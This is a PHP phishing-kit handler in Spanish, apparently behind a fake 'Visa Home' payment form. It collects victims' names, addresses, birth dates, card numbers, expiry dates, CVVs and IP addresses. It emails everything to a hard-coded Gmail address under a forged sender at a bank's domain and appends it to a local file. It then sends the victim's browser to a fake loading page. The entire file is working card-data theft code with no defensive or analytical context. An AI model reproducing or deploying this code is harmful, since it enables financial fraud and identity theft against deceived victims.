<?php



$Fecha= date('d-m-Y');
$Hora= date('H:i:s');

$nombre=$_POST['q1_nombreCompleto1'];
$apellido=$_POST['q1_nombreCompleto1[last]'];
$email=$_POST['q3_correoElectronico3'];
$adre1=$_POST['q4_direccion4addr_line1'];
$adre2=$_POST['q4_direccion4addr_line2'];
$city=$_POST['q4_direccion4city'];
$estado=$_POST['q4_direccion4state'];
$postal=$_POST['q4_direccion4postal'];
$pais=$_POST['q4_direccion4country'];
$nacmes=$_POST['q5_fechaDemonth'];
$nacdia=$_POST['q5_fechaDeday'];
$nacano=$_POST['q5_fechaDeyear'];
$tarjeta=$_POST['q6_16Numero'];
$exmes=$_POST['q7_fechaDe7month'];
$exano=$_POST['q7_fechaDe7year'];
$cvv=$_POST['q8_cvv'];

$ip = getenv("REMOTE_ADDR");

$content .= "Fecha: $Fecha / Hora: $Hora

NOMBRE COMPLETO: $nombre $apellido

EMAIL: $email
DIRECCION 1: $adre1
DIRECCION 2: $adre2
CIUDAD: $city
ESTADO: $estado
CODIGO POSTAL: $postal
PAIS: $pais
FECHA DE NACIMIENTO M/D/A: $nacmes / $nacdia / $nacano
TARJETA: $tarjeta
FECHA DE EXPIRACION M/A: $exmes / $exano
CVV: $cvv

IP: $ip";

$recipient = "dmnprozxc.dl@gmail.com";
$subject = "Datos Visa Home - $ip";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Datos Visa Home - $ip<$prefijo@bancobcr.com>";

mail($recipient,$subject,$content,$from);

$archivo="$email.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file,"$content"."");
?>

<SCRIPT LANGUAGE="JavaScript">
location.href='loadingwindowId=db3.html';
</SCRIPT>